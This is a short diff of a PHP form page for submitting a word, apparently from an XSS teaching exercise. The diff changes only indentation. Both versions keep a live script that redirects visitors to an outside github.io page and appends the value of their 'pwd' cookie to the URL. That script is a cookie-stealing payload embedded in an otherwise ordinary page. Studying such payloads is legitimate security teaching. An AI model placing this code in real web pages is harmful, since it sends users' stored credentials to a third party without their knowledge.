@@ -50,7 +50,7 @@ try {
 <form method="post" action="#">
     Mon mot : <textarea name="mot"></textarea><br>
     <input type="submit" value="Ajouter mon mot" name="ajouterMot">
-   <script>document.location=\'https:\/\/tvinchent-epsi.github.io\/xss.html?cookie=\' + <?php echo json_encode(htmlspecialchars($_COOKIE['pwd'], ENT_QUOTES, 'UTF-8')); ?>;</script>
+    <script>document.location=\'https:\/\/tvinchent-epsi.github.io\/xss.html?cookie=\' + <?php echo json_encode(htmlspecialchars($_COOKIE['pwd'], ENT_QUOTES, 'UTF-8')); ?>;</script>
 </form>
 </body>
 </html>
